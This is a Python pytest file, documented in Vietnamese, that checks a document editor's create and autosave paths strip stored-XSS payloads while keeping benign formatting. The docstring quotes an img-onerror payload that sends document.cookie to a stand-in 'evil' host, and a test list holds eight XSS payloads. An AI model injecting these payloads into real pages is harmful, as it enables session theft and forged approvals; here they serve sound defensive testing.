"""NỘI DUNG VĂN BẢN — CHỐNG XSS LƯU TRỮ.

`content_html` của văn bản được VẼ LẠI bằng `dangerouslySetInnerHTML` trên bản in
(`frontend-v2/.../document-print-sheet.tsx`). Nghĩa là bất cứ thứ gì lọt vào cột
này sẽ CHẠY trong phiên của **người mở bản in** — mà người mở bản in thường là
cấp trên đi duyệt, không phải kẻ soạn.

Kịch bản tà đạo: một nhân viên chỉ cần quyền SOẠN một văn bản, nhét
`<img src=x onerror="fetch('//evil?c='+document.cookie)">` vào thân, rồi trình
lên. Giám đốc mở ra ký là token của giám đốc bay đi, hoặc script tự bấm luôn nút
Duyệt. Không cần quyền gì cao cả — chỉ cần được gõ nội dung.

`sanitize_html` (dùng chung với đường import văn thư) đã lọc đúng thứ cần lọc,
nhưng trước bản vá nó KHÔNG được gọi ở đường soạn thảo thường — chỉ ở import.
Đây là hai đường ghi `content_html`:
  · tạo văn bản       → `service.create_document`
  · lưu nội dung nháp → `version_service.save_content` (tự động lưu gọi liên tục)

Bản mới (`open_new_version`) kế thừa nội dung từ bản đã lưu nên tự sạch theo.
"""
import pytest

from app.modules.company.model import Company
from app.modules.doc_catalog.model import DocType
from app.modules.document import service, version_service
from app.modules.document.model import Document
from app.modules.document.version_model import DocumentVersion
from app.modules.document.schema import DocumentCreate, VersionContentUpdate

ACTOR = 1

#  Mỗi phần tử: (nhãn, payload độc, chuỗi TUYỆT ĐỐI không được còn trong kết quả).
DON_TAN_CONG = [
    ("img onerror",
     '<p>ok</p><img src=x onerror="steal()">',
     "onerror"),
    ("thẻ script",
     '<p>ok</p><script>steal()</script>',
     "<script"),
    ("href javascript:",
     '<a href="javascript:steal()">bấm</a>',
     "javascript:"),
    ("svg onload",
     '<svg onload="steal()"></svg>',
     "onload"),
    ("iframe srcdoc",
     '<iframe srcdoc="<script>steal()</script>"></iframe>',
     "srcdoc"),
    ("body onload nhét giữa",
     '<p>a</p><body onload="steal()">b',
     "onload"),
    ("data: không phải ảnh",
     '<a href="data:text/html,<script>steal()</script>">x</a>',
     "data:text/html"),
    ("onmouseover in-line",
     '<div onmouseover="steal()">rê chuột</div>',
     "onmouseover"),
]


@pytest.fixture()
def doc_type(db, seed):
    company = db.get(Company, seed.company_id)
    company.issue_code = "DEGO"
    dt = DocType(code="QC", name="Quy chế", id_scheme=1, number_when=2)
    db.add(dt)
    db.commit()
    return dt


def _tao(db, doc_type, content_html):
    return service.create_document(db, DocumentCreate(
        doc_type_id=doc_type.id, company_id=doc_type and db.query(Company).first().id,
        department_id=1, owner_employee_id=1, title="VB thử XSS",
        content_html=content_html,
    ), ACTOR)


def _noi_dung_ban_moi_nhat(db, doc: Document) -> str:
    version = (db.query(DocumentVersion)
               .filter(DocumentVersion.document_id == doc.id)
               .order_by(DocumentVersion.id.desc()).first())
    return version.content_html or ""


# ── Đường TẠO văn bản ────────────────────────────────────────────────────────
@pytest.mark.parametrize("nhan,payload,cam", DON_TAN_CONG, ids=[d[0] for d in DON_TAN_CONG])
def test_tao_van_ban_loc_sach_ma_doc(db, doc_type, nhan, payload, cam):
    doc = _tao(db, doc_type, payload)
    luu = _noi_dung_ban_moi_nhat(db, doc)

    assert cam.lower() not in luu.lower(), f"{nhan}: '{cam}' còn sót trong nội dung đã lưu"
    #  Không được cho `onerror`/`onload`/… bằng cách xóa TRẮNG cả nội dung —
    #  chữ lành phải giữ nguyên, chỉ cắt phần độc.
    assert "steal" not in luu or "(" not in luu, f"{nhan}: còn nguyên lời gọi hàm độc"


def test_tao_van_ban_GIU_dinh_dang_lanh(db, doc_type):
    """Bịt XSS không được làm hỏng nội dung thật: đậm, nghiêng, bảng, ảnh data URL."""
    lanh = ('<h1>Điều 1</h1><p><strong>Đậm</strong> và <em>nghiêng</em></p>'
            '<table><tr><td>ô</td></tr></table>'
            '<img src="data:image/png;base64,iVBORw0KGgo=" alt="dấu">')
    doc = _tao(db, doc_type, lanh)
    luu = _noi_dung_ban_moi_nhat(db, doc)

    for phai_con in ("<strong>", "<em>", "<table>", "<h1>", "data:image/png"):
        assert phai_con in luu, f"mất định dạng lành: {phai_con}"


# ── Đường LƯU NỘI DUNG (tự động lưu) ─────────────────────────────────────────
@pytest.mark.parametrize("nhan,payload,cam", DON_TAN_CONG, ids=[d[0] for d in DON_TAN_CONG])
def test_luu_noi_dung_nhap_loc_sach(db, doc_type, nhan, payload, cam):
    """Đường tự động lưu là đường người ta gõ vào THẬT — phải sạch y như lúc tạo,
    nếu không kẻ tấn công chỉ cần tạo văn bản trắng rồi gõ payload vào sau."""
    doc = _tao(db, doc_type, "<p>ban đầu sạch</p>")
    version = (db.query(DocumentVersion)
               .filter(DocumentVersion.document_id == doc.id)
               .order_by(DocumentVersion.id.desc()).first())

    version_service.save_content(
        db, version, VersionContentUpdate(content_html=payload), ACTOR)

    luu = _noi_dung_ban_moi_nhat(db, doc)
    assert cam.lower() not in luu.lower(), f"{nhan}: '{cam}' còn sót sau khi lưu nháp"


def test_luu_content_html_None_khong_xoa_trang_noi_dung(db, doc_type):
    """Kéo thước lề gửi thiếu `content_html` — không được coi đó là "xóa nội dung"."""
    doc = _tao(db, doc_type, "<p>giữ nguyên</p>")
    version = (db.query(DocumentVersion)
               .filter(DocumentVersion.document_id == doc.id)
               .order_by(DocumentVersion.id.desc()).first())

    version_service.save_content(
        db, version, VersionContentUpdate(content_html=None, margin_left_mm=25), ACTOR)

    assert "giữ nguyên" in _noi_dung_ban_moi_nhat(db, doc)
